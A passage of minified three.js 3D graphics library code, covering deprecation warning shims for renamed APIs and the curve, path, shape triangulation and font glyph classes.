instead.\")},setEulerFromQuaternion:function(){console.error(\"THREE.Vector3: .setEulerFromQuaternion() has been removed. Use Euler.setFromQuaternion() instead.\")},getPositionFromMatrix:function(a){console.warn(\"THREE.Vector3: .getPositionFromMatrix() has been renamed to .setFromMatrixPosition().\");return this.setFromMatrixPosition(a)},\ngetScaleFromMatrix:function(a){console.warn(\"THREE.Vector3: .getScaleFromMatrix() has been renamed to .setFromMatrixScale().\");return this.setFromMatrixScale(a)},getColumnFromMatrix:function(a,b){console.warn(\"THREE.Vector3: .getColumnFromMatrix() has been renamed to .setFromMatrixColumn().\");return this.setFromMatrixColumn(b,a)}});\nObject.assign(THREE.Object3D.prototype,{getChildByName:function(a){console.warn(\"THREE.Object3D: .getChildByName() has been renamed to .getObjectByName().\");return this.getObjectByName(a)},renderDepth:function(a){console.warn(\"THREE.Object3D: .renderDepth has been removed. Use .renderOrder, instead.\")},translate:function(a,b){console.warn(\"THREE.Object3D: .translate() has been removed. Use .translateOnAxis( axis, distance ) instead.\");return this.translateOnAxis(b,a)}});\nObject.defineProperties(THREE.Object3D.prototype,{eulerOrder:{get:function(){console.warn(\"THREE.Object3D: .eulerOrder is now .rotation.order.\");return this.rotation.order},set:function(a){console.warn(\"THREE.Object3D: .eulerOrder is now .rotation.order.\");this.rotation.order=a}},useQuaternion:{get:function(){console.warn(\"THREE.Object3D: .useQuaternion has been removed. The library now uses quaternions by default.\")},set:function(a){console.warn(\"THREE.Object3D: .useQuaternion has been removed. The library now uses quaternions by default.\")}}});\nObject.defineProperties(THREE.LOD.prototype,{objects:{get:function(){console.warn(\"THREE.LOD: .objects has been renamed to .levels.\");return this.levels}}});THREE.PerspectiveCamera.prototype.setLens=function(a,b){console.warn(\"THREE.PerspectiveCamera.setLens is deprecated. Use .setFocalLength and .filmGauge for a photographic setup.\");void 0!==b&&(this.filmGauge=b);this.setFocalLength(a)};\nObject.defineProperties(THREE.Light.prototype,{onlyShadow:{set:function(a){console.warn(\"THREE.Light: .onlyShadow has been removed.\")}},shadowCameraFov:{set:function(a){console.warn(\"THREE.Light: .shadowCameraFov is now .shadow.camera.fov.\");this.shadow.camera.fov=a}},shadowCameraLeft:{set:function(a){console.warn(\"THREE.Light: .shadowCameraLeft is now .shadow.camera.left.\");this.shadow.camera.left=a}},shadowCameraRight:{set:function(a){console.warn(\"THREE.Light: .shadowCameraRight is now .shadow.camera.right.\");\nthis.shadow.camera.right=a}},shadowCameraTop:{set:function(a){console.warn(\"THREE.Light: .shadowCameraTop is now .shadow.camera.top.\");this.shadow.camera.top=a}},shadowCameraBottom:{set:function(a){console.warn(\"THREE.Light: .shadowCameraBottom is now .shadow.camera.bottom.\");this.shadow.camera.bottom=a}},shadowCameraNear:{set:function(a){console.warn(\"THREE.Light: .shadowCameraNear is now .shadow.camera.near.\");this.shadow.camera.near=a}},shadowCameraFar:{set:function(a){console.warn(\"THREE.Light: .shadowCameraFar is now .shadow.camera.far.\");\nthis.shadow.camera.far=a}},shadowCameraVisible:{set:function(a){console.warn(\"THREE.Light: .shadowCameraVisible has been removed. Use new THREE.CameraHelper( light.shadow.camera ) instead.\")}},shadowBias:{set:function(a){console.warn(\"THREE.Light: .shadowBias is now .shadow.bias.\");this.shadow.bias=a}},shadowDarkness:{set:function(a){console.warn(\"THREE.Light: .shadowDarkness has been removed.\")}},shadowMapWidth:{set:function(a){console.warn(\"THREE.Light: .shadowMapWidth is now .shadow.mapSize.width.\");\nthis.shadow.mapSize.width=a}},shadowMapHeight:{set:function(a){console.warn(\"THREE.Light: .shadowMapHeight is now .shadow.mapSize.height.\");this.shadow.mapSize.height=a}}});Object.defineProperties(THREE.BufferAttribute.prototype,{length:{get:function(){console.warn(\"THREE.BufferAttribute: .length has been deprecated. Please use .count.\");return this.array.length}}});\nObject.assign(THREE.BufferGeometry.prototype,{addIndex:function(a){console.warn(\"THREE.BufferGeometry: .addIndex() has been renamed to .setIndex().\");this.setIndex(a)},addDrawCall:function(a,b,c){void 0!==c&&console.warn(\"THREE.BufferGeometry: .addDrawCall() no longer supports indexOffset.\");console.warn(\"THREE.BufferGeometry: .addDrawCall() is now .addGroup().\");this.addGroup(a,b)},clearDrawCalls:function(){console.warn(\"THREE.BufferGeometry: .clearDrawCalls() is now .clearGroups().\");this.clearGroups()},\ncomputeTangents:function(){console.warn(\"THREE.BufferGeometry: .computeTangents() has been removed.\")},computeOffsets:function(){console.warn(\"THREE.BufferGeometry: .computeOffsets() has been removed.\")}});Object.defineProperties(THREE.BufferGeometry.prototype,{drawcalls:{get:function(){console.error(\"THREE.BufferGeometry: .drawcalls has been renamed to .groups.\");return this.groups}},offsets:{get:function(){console.warn(\"THREE.BufferGeometry: .offsets has been renamed to .groups.\");return this.groups}}});\nObject.defineProperties(THREE.Material.prototype,{wrapAround:{get:function(){console.warn(\"THREE.\"+this.type+\": .wrapAround has been removed.\")},set:function(a){console.warn(\"THREE.\"+this.type+\": .wrapAround has been removed.\")}},wrapRGB:{get:function(){console.warn(\"THREE.\"+this.type+\": .wrapRGB has been removed.\");return new THREE.Color}}});\nObject.defineProperties(THREE.MeshPhongMaterial.prototype,{metal:{get:function(){console.warn(\"THREE.MeshPhongMaterial: .metal has been removed. Use THREE.MeshStandardMaterial instead.\");return!1},set:function(a){console.warn(\"THREE.MeshPhongMaterial: .metal has been removed. Use THREE.MeshStandardMaterial instead\")}}});\nObject.defineProperties(THREE.ShaderMaterial.prototype,{derivatives:{get:function(){console.warn(\"THREE.ShaderMaterial: .derivatives has been moved to .extensions.derivatives.\");return this.extensions.derivatives},set:function(a){console.warn(\"THREE. ShaderMaterial: .derivatives has been moved to .extensions.derivatives.\");this.extensions.derivatives=a}}});\nTHREE.EventDispatcher.prototype=Object.assign(Object.create({constructor:THREE.EventDispatcher,apply:function(a){console.warn(\"THREE.EventDispatcher: .apply is deprecated, just inherit or Object.assign the prototype to mix-in.\");Object.assign(a,this)}}),THREE.EventDispatcher.prototype);\nObject.assign(THREE.WebGLRenderer.prototype,{supportsFloatTextures:function(){console.warn(\"THREE.WebGLRenderer: .supportsFloatTextures() is now .extensions.get( 'OES_texture_float' ).\");return this.extensions.get(\"OES_texture_float\")},supportsHalfFloatTextures:function(){console.warn(\"THREE.WebGLRenderer: .supportsHalfFloatTextures() is now .extensions.get( 'OES_texture_half_float' ).\");return this.extensions.get(\"OES_texture_half_float\")},supportsStandardDerivatives:function(){console.warn(\"THREE.WebGLRenderer: .supportsStandardDerivatives() is now .extensions.get( 'OES_standard_derivatives' ).\");\nreturn this.extensions.get(\"OES_standard_derivatives\")},supportsCompressedTextureS3TC:function(){console.warn(\"THREE.WebGLRenderer: .supportsCompressedTextureS3TC() is now .extensions.get( 'WEBGL_compressed_texture_s3tc' ).\");return this.extensions.get(\"WEBGL_compressed_texture_s3tc\")},supportsCompressedTexturePVRTC:function(){console.warn(\"THREE.WebGLRenderer: .supportsCompressedTexturePVRTC() is now .extensions.get( 'WEBGL_compressed_texture_pvrtc' ).\");return this.extensions.get(\"WEBGL_compressed_texture_pvrtc\")},\nsupportsBlendMinMax:function(){console.warn(\"THREE.WebGLRenderer: .supportsBlendMinMax() is now .extensions.get( 'EXT_blend_minmax' ).\");return this.extensions.get(\"EXT_blend_minmax\")},supportsVertexTextures:function(){return this.capabilities.vertexTextures},supportsInstancedArrays:function(){console.warn(\"THREE.WebGLRenderer: .supportsInstancedArrays() is now .extensions.get( 'ANGLE_instanced_arrays' ).\");return this.extensions.get(\"ANGLE_instanced_arrays\")},enableScissorTest:function(a){console.warn(\"THREE.WebGLRenderer: .enableScissorTest() is now .setScissorTest().\");\nthis.setScissorTest(a)},initMaterial:function(){console.warn(\"THREE.WebGLRenderer: .initMaterial() has been removed.\")},addPrePlugin:function(){console.warn(\"THREE.WebGLRenderer: .addPrePlugin() has been removed.\")},addPostPlugin:function(){console.warn(\"THREE.WebGLRenderer: .addPostPlugin() has been removed.\")},updateShadowMap:function(){console.warn(\"THREE.WebGLRenderer: .updateShadowMap() has been removed.\")}});\nObject.defineProperties(THREE.WebGLRenderer.prototype,{shadowMapEnabled:{get:function(){return this.shadowMap.enabled},set:function(a){console.warn(\"THREE.WebGLRenderer: .shadowMapEnabled is now .shadowMap.enabled.\");this.shadowMap.enabled=a}},shadowMapType:{get:function(){return this.shadowMap.type},set:function(a){console.warn(\"THREE.WebGLRenderer: .shadowMapType is now .shadowMap.type.\");this.shadowMap.type=a}},shadowMapCullFace:{get:function(){return this.shadowMap.cullFace},set:function(a){console.warn(\"THREE.WebGLRenderer: .shadowMapCullFace is now .shadowMap.cullFace.\");\nthis.shadowMap.cullFace=a}}});Object.defineProperties(THREE.WebGLShadowMap.prototype,{cullFace:{get:function(){return this.renderReverseSided?THREE.CullFaceFront:THREE.CullFaceBack},set:function(a){a=a!==THREE.CullFaceBack;console.warn(\"WebGLRenderer: .shadowMap.cullFace is deprecated. Set .shadowMap.renderReverseSided to \"+a+\".\");this.renderReverseSided=a}}});\nObject.defineProperties(THREE.WebGLRenderTarget.prototype,{wrapS:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .wrapS is now .texture.wrapS.\");return this.texture.wrapS},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .wrapS is now .texture.wrapS.\");this.texture.wrapS=a}},wrapT:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .wrapT is now .texture.wrapT.\");return this.texture.wrapT},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .wrapT is now .texture.wrapT.\");this.texture.wrapT=\na}},magFilter:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .magFilter is now .texture.magFilter.\");return this.texture.magFilter},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .magFilter is now .texture.magFilter.\");this.texture.magFilter=a}},minFilter:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .minFilter is now .texture.minFilter.\");return this.texture.minFilter},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .minFilter is now .texture.minFilter.\");this.texture.minFilter=\na}},anisotropy:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .anisotropy is now .texture.anisotropy.\");return this.texture.anisotropy},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .anisotropy is now .texture.anisotropy.\");this.texture.anisotropy=a}},offset:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .offset is now .texture.offset.\");return this.texture.offset},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .offset is now .texture.offset.\");this.texture.offset=\na}},repeat:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .repeat is now .texture.repeat.\");return this.texture.repeat},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .repeat is now .texture.repeat.\");this.texture.repeat=a}},format:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .format is now .texture.format.\");return this.texture.format},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .format is now .texture.format.\");this.texture.format=a}},type:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .type is now .texture.type.\");\nreturn this.texture.type},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .type is now .texture.type.\");this.texture.type=a}},generateMipmaps:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .generateMipmaps is now .texture.generateMipmaps.\");return this.texture.generateMipmaps},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .generateMipmaps is now .texture.generateMipmaps.\");this.texture.generateMipmaps=a}}});\nObject.assign(THREE.Audio.prototype,{load:function(a){console.warn(\"THREE.Audio: .load has been deprecated. Please use THREE.AudioLoader.\");var b=this;(new THREE.AudioLoader).load(a,function(a){b.setBuffer(a)});return this}});Object.assign(THREE.AudioAnalyser.prototype,{getData:function(a){console.warn(\"THREE.AudioAnalyser: .getData() is now .getFrequencyData().\");return this.getFrequencyData()}});\nTHREE.GeometryUtils={merge:function(a,b,c){console.warn(\"THREE.GeometryUtils: .merge() has been moved to Geometry. Use geometry.merge( geometry2, matrix, materialIndexOffset ) instead.\");var d;b instanceof THREE.Mesh&&(b.matrixAutoUpdate&&b.updateMatrix(),d=b.matrix,b=b.geometry);a.merge(b,d,c)},center:function(a){console.warn(\"THREE.GeometryUtils: .center() has been moved to Geometry. Use geometry.center() instead.\");return a.center()}};\nTHREE.ImageUtils={crossOrigin:void 0,loadTexture:function(a,b,c,d){console.warn(\"THREE.ImageUtils.loadTexture has been deprecated. Use THREE.TextureLoader() instead.\");var e=new THREE.TextureLoader;e.setCrossOrigin(this.crossOrigin);a=e.load(a,c,void 0,d);b&&(a.mapping=b);return a},loadTextureCube:function(a,b,c,d){console.warn(\"THREE.ImageUtils.loadTextureCube has been deprecated. Use THREE.CubeTextureLoader() instead.\");var e=new THREE.CubeTextureLoader;e.setCrossOrigin(this.crossOrigin);a=e.load(a,\nc,void 0,d);b&&(a.mapping=b);return a},loadCompressedTexture:function(){console.error(\"THREE.ImageUtils.loadCompressedTexture has been removed. Use THREE.DDSLoader instead.\")},loadCompressedTextureCube:function(){console.error(\"THREE.ImageUtils.loadCompressedTextureCube has been removed. Use THREE.DDSLoader instead.\")}};\nTHREE.Projector=function(){console.error(\"THREE.Projector has been moved to /examples/js/renderers/Projector.js.\");this.projectVector=function(a,b){console.warn(\"THREE.Projector: .projectVector() is now vector.project().\");a.project(b)};this.unprojectVector=function(a,b){console.warn(\"THREE.Projector: .unprojectVector() is now vector.unproject().\");a.unproject(b)};this.pickingRay=function(a,b){console.error(\"THREE.Projector: .pickingRay() is now raycaster.setFromCamera().\")}};\nTHREE.CanvasRenderer=function(){console.error(\"THREE.CanvasRenderer has been moved to /examples/js/renderers/CanvasRenderer.js\");this.domElement=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");this.clear=function(){};this.render=function(){};this.setClearColor=function(){};this.setSize=function(){}};\nTHREE.CurveUtils={tangentQuadraticBezier:function(a,b,c,d){return 2*(1-a)*(c-b)+2*a*(d-c)},tangentCubicBezier:function(a,b,c,d,e){return-3*b*(1-a)*(1-a)+3*c*(1-a)*(1-a)-6*a*c*(1-a)+6*a*d*(1-a)-3*a*a*d+3*a*a*e},tangentSpline:function(a,b,c,d,e){return 6*a*a-6*a+(3*a*a-4*a+1)+(-6*a*a+6*a)+(3*a*a-2*a)},interpolate:function(a,b,c,d,e){a=.5*(c-a);d=.5*(d-b);var f=e*e;return(2*b-2*c+a+d)*e*f+(-3*b+3*c-2*a-d)*f+a*e+b}};\nTHREE.SceneUtils={createMultiMaterialObject:function(a,b){for(var c=new THREE.Group,d=0,e=b.length;d<e;d++)c.add(new THREE.Mesh(a,b[d]));return c},detach:function(a,b,c){a.applyMatrix(b.matrixWorld);b.remove(a);c.add(a)},attach:function(a,b,c){var d=new THREE.Matrix4;d.getInverse(c.matrixWorld);a.applyMatrix(d);b.remove(a);c.add(a)}};\nTHREE.ShapeUtils={area:function(a){for(var b=a.length,c=0,d=b-1,e=0;e<b;d=e++)c+=a[d].x*a[e].y-a[e].x*a[d].y;return.5*c},triangulate:function(){return function(a,b){var c=a.length;if(3>c)return null;var d=[],e=[],f=[],g,h,k;if(0<THREE.ShapeUtils.area(a))for(h=0;h<c;h++)e[h]=h;else for(h=0;h<c;h++)e[h]=c-1-h;var l=2*c;for(h=c-1;2<c;){if(0>=l--){console.warn(\"THREE.ShapeUtils: Unable to triangulate polygon! in triangulate()\");break}g=h;c<=g&&(g=0);h=g+1;c<=h&&(h=0);k=h+1;c<=k&&(k=0);var n;a:{var p=\nn=void 0,m=void 0,q=void 0,r=void 0,s=void 0,t=void 0,u=void 0,v=void 0,p=a[e[g]].x,m=a[e[g]].y,q=a[e[h]].x,r=a[e[h]].y,s=a[e[k]].x,t=a[e[k]].y;if(Number.EPSILON>(q-p)*(t-m)-(r-m)*(s-p))n=!1;else{var C=void 0,w=void 0,E=void 0,z=void 0,y=void 0,A=void 0,I=void 0,B=void 0,F=void 0,K=void 0,F=B=I=v=u=void 0,C=s-q,w=t-r,E=p-s,z=m-t,y=q-p,A=r-m;for(n=0;n<c;n++)if(u=a[e[n]].x,v=a[e[n]].y,!(u===p&&v===m||u===q&&v===r||u===s&&v===t)&&(I=u-p,B=v-m,F=u-q,K=v-r,u-=s,v-=t,F=C*K-w*F,I=y*B-A*I,B=E*v-z*u,F>=-Number.EPSILON&&\nB>=-Number.EPSILON&&I>=-Number.EPSILON)){n=!1;break a}n=!0}}if(n){d.push([a[e[g]],a[e[h]],a[e[k]]]);f.push([e[g],e[h],e[k]]);g=h;for(k=h+1;k<c;g++,k++)e[g]=e[k];c--;l=2*c}}return b?f:d}}(),triangulateShape:function(a,b){function c(a,b,c){return a.x!==b.x?a.x<b.x?a.x<=c.x&&c.x<=b.x:b.x<=c.x&&c.x<=a.x:a.y<b.y?a.y<=c.y&&c.y<=b.y:b.y<=c.y&&c.y<=a.y}function d(a,b,d,e,f){var g=b.x-a.x,h=b.y-a.y,k=e.x-d.x,l=e.y-d.y,n=a.x-d.x,p=a.y-d.y,y=h*k-g*l,A=h*n-g*p;if(Math.abs(y)>Number.EPSILON){if(0<y){if(0>A||A>\ny)return[];k=l*n-k*p;if(0>k||k>y)return[]}else{if(0<A||A<y)return[];k=l*n-k*p;if(0<k||k<y)return[]}if(0===k)return!f||0!==A&&A!==y?[a]:[];if(k===y)return!f||0!==A&&A!==y?[b]:[];if(0===A)return[d];if(A===y)return[e];f=k/y;return[{x:a.x+f*g,y:a.y+f*h}]}if(0!==A||l*n!==k*p)return[];h=0===g&&0===h;k=0===k&&0===l;if(h&&k)return a.x!==d.x||a.y!==d.y?[]:[a];if(h)return c(d,e,a)?[a]:[];if(k)return c(a,b,d)?[d]:[];0!==g?(a.x<b.x?(g=a,k=a.x,h=b,a=b.x):(g=b,k=b.x,h=a,a=a.x),d.x<e.x?(b=d,y=d.x,l=e,d=e.x):(b=\ne,y=e.x,l=d,d=d.x)):(a.y<b.y?(g=a,k=a.y,h=b,a=b.y):(g=b,k=b.y,h=a,a=a.y),d.y<e.y?(b=d,y=d.y,l=e,d=e.y):(b=e,y=e.y,l=d,d=d.y));return k<=y?a<y?[]:a===y?f?[]:[b]:a<=d?[b,h]:[b,l]:k>d?[]:k===d?f?[]:[g]:a<=d?[g,h]:[g,l]}function e(a,b,c,d){var e=b.x-a.x,f=b.y-a.y;b=c.x-a.x;c=c.y-a.y;var g=d.x-a.x;d=d.y-a.y;a=e*c-f*b;e=e*d-f*g;return Math.abs(a)>Number.EPSILON?(b=g*c-d*b,0<a?0<=e&&0<=b:0<=e||0<=b):0<e}var f,g,h,k,l,n={};h=a.concat();f=0;for(g=b.length;f<g;f++)Array.prototype.push.apply(h,b[f]);f=0;for(g=\nh.length;f<g;f++)l=h[f].x+\":\"+h[f].y,void 0!==n[l]&&console.warn(\"THREE.Shape: Duplicate point\",l),n[l]=f;f=function(a,b){function c(a,b){var d=h.length-1,f=a-1;0>f&&(f=d);var g=a+1;g>d&&(g=0);d=e(h[a],h[f],h[g],k[b]);if(!d)return!1;d=k.length-1;f=b-1;0>f&&(f=d);g=b+1;g>d&&(g=0);return(d=e(k[b],k[f],k[g],h[a]))?!0:!1}function f(a,b){var c,e;for(c=0;c<h.length;c++)if(e=c+1,e%=h.length,e=d(a,b,h[c],h[e],!0),0<e.length)return!0;return!1}function g(a,c){var e,f,h,k;for(e=0;e<l.length;e++)for(f=b[l[e]],\nh=0;h<f.length;h++)if(k=h+1,k%=f.length,k=d(a,c,f[h],f[k],!0),0<k.length)return!0;return!1}var h=a.concat(),k,l=[],n,p,z,y,A,I=[],B,F,K,P=0;for(n=b.length;P<n;P++)l.push(P);B=0;for(var M=2*l.length;0<l.length;){M--;if(0>M){console.log(\"Infinite Loop! Holes left:\"+l.length+\", Probably Hole outside Shape!\");break}for(p=B;p<h.length;p++){z=h[p];n=-1;for(P=0;P<l.length;P++)if(y=l[P],A=z.x+\":\"+z.y+\":\"+y,void 0===I[A]){k=b[y];for(F=0;F<k.length;F++)if(y=k[F],c(p,F)&&!f(z,y)&&!g(z,y)){n=F;l.splice(P,1);\nB=h.slice(0,p+1);y=h.slice(p);F=k.slice(n);K=k.slice(0,n+1);h=B.concat(F).concat(K).concat(y);B=p;break}if(0<=n)break;I[A]=!0}if(0<=n)break}}return h}(a,b);var p=THREE.ShapeUtils.triangulate(f,!1);f=0;for(g=p.length;f<g;f++)for(k=p[f],h=0;3>h;h++)l=k[h].x+\":\"+k[h].y,l=n[l],void 0!==l&&(k[h]=l);return p.concat()},isClockWise:function(a){return 0>THREE.ShapeUtils.area(a)},b2:function(){return function(a,b,c,d){var e=1-a;return e*e*b+2*(1-a)*a*c+a*a*d}}(),b3:function(){return function(a,b,c,d,e){var f=\n1-a,g=1-a;return f*f*f*b+3*g*g*a*c+3*(1-a)*a*a*d+a*a*a*e}}()};THREE.Curve=function(){};\nTHREE.Curve.prototype={constructor:THREE.Curve,getPoint:function(a){console.warn(\"THREE.Curve: Warning, getPoint() not implemented!\");return null},getPointAt:function(a){a=this.getUtoTmapping(a);return this.getPoint(a)},getPoints:function(a){a||(a=5);var b,c=[];for(b=0;b<=a;b++)c.push(this.getPoint(b/a));return c},getSpacedPoints:function(a){a||(a=5);var b,c=[];for(b=0;b<=a;b++)c.push(this.getPointAt(b/a));return c},getLength:function(){var a=this.getLengths();return a[a.length-1]},getLengths:function(a){a||\n(a=this.__arcLengthDivisions?this.__arcLengthDivisions:200);if(this.cacheArcLengths&&this.cacheArcLengths.length===a+1&&!this.needsUpdate)return this.cacheArcLengths;this.needsUpdate=!1;var b=[],c,d=this.getPoint(0),e,f=0;b.push(0);for(e=1;e<=a;e++)c=this.getPoint(e/a),f+=c.distanceTo(d),b.push(f),d=c;return this.cacheArcLengths=b},updateArcLengths:function(){this.needsUpdate=!0;this.getLengths()},getUtoTmapping:function(a,b){var c=this.getLengths(),d=0,e=c.length,f;f=b?b:a*c[e-1];for(var g=0,h=e-\n1,k;g<=h;)if(d=Math.floor(g+(h-g)/2),k=c[d]-f,0>k)g=d+1;else if(0<k)h=d-1;else{h=d;break}d=h;if(c[d]===f)return d/(e-1);g=c[d];return c=(d+(f-g)/(c[d+1]-g))/(e-1)},getTangent:function(a){var b=a-1E-4;a+=1E-4;0>b&&(b=0);1<a&&(a=1);b=this.getPoint(b);return this.getPoint(a).clone().sub(b).normalize()},getTangentAt:function(a){a=this.getUtoTmapping(a);return this.getTangent(a)}};\nTHREE.Curve.create=function(a,b){a.prototype=Object.create(THREE.Curve.prototype);a.prototype.constructor=a;a.prototype.getPoint=b;return a};THREE.CurvePath=function(){this.curves=[];this.autoClose=!1};\nTHREE.CurvePath.prototype=Object.assign(Object.create(THREE.Curve.prototype),{constructor:THREE.CurvePath,add:function(a){this.curves.push(a)},closePath:function(){var a=this.curves[0].getPoint(0),b=this.curves[this.curves.length-1].getPoint(1);a.equals(b)||this.curves.push(new THREE.LineCurve(b,a))},getPoint:function(a){for(var b=a*this.getLength(),c=this.getCurveLengths(),d=0;d<c.length;){if(c[d]>=b)return a=this.curves[d],b=1-(c[d]-b)/a.getLength(),a.getPointAt(b);d++}return null},getLength:function(){var a=\nthis.getCurveLengths();return a[a.length-1]},updateArcLengths:function(){this.needsUpdate=!0;this.cacheLengths=null;this.getLengths()},getCurveLengths:function(){if(this.cacheLengths&&this.cacheLengths.length===this.curves.length)return this.cacheLengths;for(var a=[],b=0,c=0,d=this.curves.length;c<d;c++)b+=this.curves[c].getLength(),a.push(b);return this.cacheLengths=a},createPointsGeometry:function(a){a=this.getPoints(a);return this.createGeometry(a)},createSpacedPointsGeometry:function(a){a=this.getSpacedPoints(a);\nreturn this.createGeometry(a)},createGeometry:function(a){for(var b=new THREE.Geometry,c=0,d=a.length;c<d;c++){var e=a[c];b.vertices.push(new THREE.Vector3(e.x,e.y,e.z||0))}return b}});THREE.Font=function(a){this.data=a};\nObject.assign(THREE.Font.prototype,{generateShapes:function(a,b,c){void 0===b&&(b=100);void 0===c&&(c=4);var d=this.data;a=String(a).split(\"\");var e=b/d.resolution,f=0;b=[];for(var g=0;g<a.length;g++){var h;h=e;var k=f,l=d.glyphs[a[g]]||d.glyphs[\"?\"];if(l){var n=new THREE.Path,p=[],m=THREE.ShapeUtils.b2,q=THREE.ShapeUtils.b3,r=void 0,s=void 0,t=s=r=void 0,u=void 0,v=void 0,C=void 0,w=void 0,E=void 0,u=void 0;if(l.o)for(var z=l._cachedOutline||(l._cachedOutline=l.o.split(\" \")),y=0,A=z.length;y<A;)switch(z[y++]){case \"m\":r=\nz[y++]*h+k;s=z[y++]*h;n.moveTo(r,s);break;case \"l\":r=z[y++]*h+k;s=z[y++]*h;n.lineTo(r,s);break;case \"q\":r=z[y++]*h+k;s=z[y++]*h;v=z[y++]*h+k;C=z[y++]*h;n.quadraticCurveTo(v,C,r,s);if(u=p[p.length-1])for(var t=u.x,u=u.y,I=1;I<=c;I++){var B=I/c;m(B,t,v,r);m(B,u,C,s)}break;case \"b\":if(r=z[y++]*h+k,s=z[y++]*h,v=z[y++]*h+k,C=z[y++]*h,w=z[y++]*h+k,E=z[y++]*h,n.bezierCurveTo(v,C,w,E,r,s),u=p[p.length-1])for(t=u.x,u=u.y,I=1;I<=c;I++)B=I/c,q(B,t,v,w,r),q(B,u,C,E,s)}h={offset:l.ha*h,path:n}}else h=void 0;f+=\nh.offset;b.push(h.path)}c=[];d=0;for(a=b.length;d<a;d++)Array.prototype.push.apply(c,b[d].toShapes());return c}});THREE.Path=function(a){THREE.CurvePath.call(this);this.actions=[];a&&this.fromPoints(a)};\nTHREE.Path.prototype=Object.assign(Object.create(THREE.CurvePath.prototype),{constructor:THREE.Path,fromPoints:function(a){this.moveTo(a[0].x,a[0].y);for(var b=1,c=a.length;b<c;b++)this.lineTo(a[b].x,a[b].y)},moveTo:function(a,b){this.actions.push({action:\"moveTo\",args:[a,b]})},lineTo:function(a,b){var c=this.actions[this.actions.length-1].args,c=new THREE.LineCurve(new THREE.Vector2(c[c.length-2],c[c.length-1]),new THREE.Vector2(a,b));this.curves.push(c);this.actions.push({action:\"lineTo\",args:[a,\nb]})},quadraticCurveTo:function(a,b,c,d){var e=this.actions[this.actions.length-1].args,e=new THREE.QuadraticBezierCurve(new THREE.Vector2(e[e.length-2],e[e.length-1]),new THREE.Vector2(a,b),new THREE.Vector2(c,d));this.curves.push(e);this.actions.push({action:\"quadraticCurveTo\",args:[a,b,c,d]})},bezierCurveTo:function(a,b,c,d,e,f){var g=this.actions[this.actions.length-1].args,g=new THREE.CubicBezierCurve(new THREE.Vector2(g[g.length-2],g[g.length-1]),new THREE.Vector2(a,b),new THREE.Vector2(c,d),\nnew THREE.Vector2(e,f));this.curves.push(g);this.actions.push({action:\"bezierCurveTo\",args:[a,b,c,d,e,f]})},splineThru:function(a){var b=Array.prototype.slice.call(arguments),c=this.actions[this.actions.length-1].args,c=[new THREE.Vector2(c[c.length-2],c[c.length-1])];Array.prototype.push.apply(c,a);c=new THREE.SplineCurve(c);this.curves.push(c);c=a[a.length-1];b.push(c.x);b.push(c.y);this.actions.push({action:\"splineThru\",args:b})},arc:function(a,b,c,d,e,f){var g=this.actions[this.actions.length-\n1].args;this.absarc(a+g[g.length-2],b+g[g.length-1],c,d,e,f)},absarc:function(a,b,c,d,e,f){this.absellipse(a,b,c,c,d,e,f)},ellipse:function(a,b,c,d,e,f,g,h){var k=this.actions[this.actions.length-1].args;this.absellipse(a+k[k.length-2],b+k[k.length-1],c,d,e,f,g,h)},absellipse:function(a,b,c,d,e,f,g,h){var k=[a,b,c,d,e,f,g,h||0];a=new THREE.EllipseCurve(a,b,c,d,e,f,g,h);this.curves.push(a);a=a.getPoint(1);k.push(a.x);k.push(a.y);this.actions.push({action:\"ellipse\",args:k})},getSpacedPoints:function(a){a||\n(a=40);for(var b=[],c=0;c<a;c++)b.push(this.getPoint(c/a));this.autoClose&&b.push(b[0]);return b},getPoints:function(a){a=a||12;for(var b=THREE.ShapeUtils.b2,c=THREE.ShapeUtils.b3,d=[],e,f,g,h,k,l,n,p,m,q,r=0,s=this.actions.length;r<s;r++){m=this.actions[r];var t=m.args;switch(m.action){case \"moveTo\":d.push(new THREE.Vector2(t[0],t[1]));break;case \"lineTo\":d.push(new THREE.Vector2(t[0],t[1]));break;case \"quadraticCurveTo\":e=t[2];f=t[3];k=t[0];l=t[1];0<d.length?(m=d[d.length-1],n=m.x,p=m.y):(m=this.actions[r-\n1].args,n=m[m.length-2],p=m[m.length-1]);for(t=1;t<=a;t++)q=t/a,m=b(q,n,k,e),q=b(q,p,l,f),d.push(new THREE.Vector2(m,q));break;case \"bezierCurveTo\":e=t[4];f=t[5];k=t[0];l=t[1];g=t[2];h=t[3];0<d.length?(m=d[d.length-1],n=m.x,p=m.y):(m=this.actions[r-1].args,n=m[m.length-2],p=m[m.length-1]);for(t=1;t<=a;t++)q=t/a,m=c(q,n,k,g,e),q=c(q,p,l,h,f),d.push(new THREE.Vector2(m,q));break;case \"splineThru\":m=this.actions[r-1].args;q=[new THREE.Vector2(m[m.length-2],m[m.length-1])];m=a*t[0].length;q=q.concat(t[0]);\nq=new THREE.SplineCurve(q);for(t=1;t<=m;t++)d.push(q.getPointAt(t/m));break;case \"arc\":e=t[0];f=t[1];l=t[2];g=t[3];m=t[4];k=!!t[5];n=m-g;p=2*a;for(t=1;t<=p;t++)q=t/p,k||(q=1-q),q=g+q*n,m=e+l*Math.cos(q),q=f+l*Math.sin(q),d.push(new THREE.Vector2(m,q));break;case \"ellipse\":e=t[0];f=t[1];l=t[2];h=t[3];g=t[4];m=t[5];k=!!t[6];var u=t[7];n=m-g;p=2*a;var 